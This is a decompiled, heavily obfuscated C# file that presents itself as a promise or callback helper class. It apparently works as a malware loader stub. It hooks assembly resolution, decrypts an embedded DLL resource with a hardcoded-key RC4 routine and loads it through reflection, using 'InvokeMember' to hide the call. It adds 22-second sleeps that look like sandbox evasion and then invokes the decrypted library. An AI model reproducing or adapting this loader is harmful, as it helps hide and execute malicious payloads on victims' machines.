using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using Fvdmbykqnstnp;

namespace Pjgxxrqhqvbupdz;

public sealed class o<a> : Pjgxxrqhqvbupdz.n<a>, m
{
	private List<l> m_b = new List<l>();

	private bool m_c;

	private bool m_d;

	private a m_e;

	private byte[] m_f = Encoding.UTF8.GetBytes("Vezuxgpiihhidvoslenlt");

	private int m_g;

	private int m_h;

	private int l;

	private int m;

	private int n;

	private int[] o;

	private int[] p;

	private byte[] q;

	private string r = "Pjgxxrqhqvbupdz.Fvdmbykqnstnp.dll";

	public static Pjgxxrqhqvbupdz.n<a> a(Pjgxxrqhqvbupdz.o<a> a)
	{
		return a.b();
	}

	public Pjgxxrqhqvbupdz.n<a> b()
	{
		return this;
	}

	public m beqryqfma7ryvz74q2vbm6frbbh2bt9fhac(Action a)
	{
		Thread.Sleep(22000);
		if (!this.c && !this.d)
		{
			this.b.Add(new l(a, (l.a)0, c: false));
		}
		else
		{
			a();
		}
		return this;
	}

	public Pjgxxrqhqvbupdz.n<a> b2dq9qqhy79pmhe2zajfnca6m7x6emrqhac(Action<a> a)
	{
		if (!this.c && !this.d)
		{
			this.b.Add(new l(a, (l.a)0, c: true));
		}
		else
		{
			a(this.e);
		}
		return this;
	}

	public Pjgxxrqhqvbupdz.n<a> b2dq9qqhy79pmhe2zajfnca6m7x6emrqhaf(IEnumerable<Action<a>> a)
	{
		foreach (Action<a> item in a)
		{
			b2dq9qqhy79pmhe2zajfnca6m7x6emrqhac(item);
		}
		return this;
	}

	public m beqryqfma7ryvz74q2vbm6frbbh2bt9fhaa(Action a)
	{
		if (this.c)
		{
			a();
		}
		else
		{
			this.b.Add(new l(a, (l.a)1, c: false));
		}
		return this;
	}

	public Pjgxxrqhqvbupdz.n<a> b2dq9qqhy79pmhe2zajfnca6m7x6emrqhaa(Action<a> a)
	{
		if (this.c)
		{
			a(this.e);
		}
		else
		{
			this.b.Add(new l(a, (l.a)1, c: true));
		}
		return this;
	}

	public Pjgxxrqhqvbupdz.n<a> b2dq9qqhy79pmhe2zajfnca6m7x6emrqhad(IEnumerable<Action<a>> a)
	{
		foreach (Action<a> item in a)
		{
			b2dq9qqhy79pmhe2zajfnca6m7x6emrqhaa(item);
		}
		return this;
	}

	public m beqryqfma7ryvz74q2vbm6frbbh2bt9fhab(Action a)
	{
		if (this.d)
		{
			a();
		}
		else
		{
			this.b.Add(new l(a, (l.a)2, c: false));
		}
		return this;
	}

	public Pjgxxrqhqvbupdz.n<a> b2dq9qqhy79pmhe2zajfnca6m7x6emrqhab(Action<a> a)
	{
		if (this.d)
		{
			a(this.e);
		}
		else
		{
			this.b.Add(new l(a, (l.a)2, c: true));
		}
		return this;
	}

	public Pjgxxrqhqvbupdz.n<a> b2dq9qqhy79pmhe2zajfnca6m7x6emrqhae(IEnumerable<Action<a>> a)
	{
		foreach (Action<a> item in a)
		{
			b2dq9qqhy79pmhe2zajfnca6m7x6emrqhab(item);
		}
		return this;
	}

	public bool beqryqfma7ryvz74q2vbm6frbbh2bt9fhaa()
	{
		AppDomain.CurrentDomain.AssemblyResolve += d;
		return this.d;
	}

	private byte[] c(byte[] a)
	{
		o = new int[256];
		p = new int[256];
		q = new byte[a.Length];
		this.h = 0;
		while (this.h < 256)
		{
			o[this.h] = this.f[this.h % this.f.Length];
			p[this.h] = this.h;
			this.h++;
		}
		this.h = 0;
		l = 0;
		while (this.h < 256)
		{
			l = (l + p[this.h] + o[this.h]) % 256;
			n = p[this.h];
			p[this.h] = p[l];
			p[l] = n;
			this.h++;
		}
		this.h = 0;
		l = 0;
		this.g = 0;
		while (this.h < a.Length)
		{
			this.g++;
			this.g %= 256;
			l += p[this.g];
			l %= 256;
			n = p[this.g];
			p[this.g] = p[l];
			p[l] = n;
			m = p[(p[this.g] + p[l]) % 256];
			q[this.h] = (byte)(a[this.h] ^ m);
			this.h++;
		}
		return q;
	}

	private Assembly d(object a, ResolveEventArgs b)
	{
		if (b.Name.Contains("Fvdmbykqnstnp"))
		{
			Stream? manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(r);
			MemoryStream memoryStream = new MemoryStream();
			manifestResourceStream!.CopyTo(memoryStream);
			byte[] array = c(memoryStream.ToArray());
			return e(array);
		}
		return null;
	}

	private Assembly e(byte[] a)
	{
		string name = "Load";
		return (Assembly)typeof(Assembly).InvokeMember(name, BindingFlags.InvokeMethod, null, null, new object[1] { a });
	}

	public bool beqryqfma7ryvz74q2vbm6frbbh2bt9fhab()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		new ClassLibrary().Data();
		return this.c;
	}

	public bool beqryqfma7ryvz74q2vbm6frbbh2bt9fhac()
	{
		Thread.Sleep(22000);
		if (!this.d)
		{
			return this.c;
		}
		return true;
	}

	public m f()
	{
		if (!this.d && !this.c)
		{
			this.d = true;
			j((l.a)2);
			return this;
		}
		return this;
	}

	public Pjgxxrqhqvbupdz.o<a> h(a a)
	{
		if (!this.d && !this.c)
		{
			this.d = true;
			this.e = a;
			j((l.a)2);
			return this;
		}
		return this;
	}

	public m g()
	{
		if (!this.d && !this.c)
		{
			this.c = true;
			j((l.a)1);
			return this;
		}
		return this;
	}

	public Pjgxxrqhqvbupdz.o<a> i(a a)
	{
		if (!this.d && !this.c)
		{
			this.c = true;
			this.e = a;
			j((l.a)1);
			return this;
		}
		return this;
	}

	private void j(l.a a)
	{
		foreach (l item in this.b)
		{
			if (item.a() == a || item.a() == (l.a)0)
			{
				if (item.a())
				{
					item.a().DynamicInvoke(this.e);
				}
				else
				{
					item.a().DynamicInvoke();
				}
			}
		}
		this.b.Clear();
	}
}
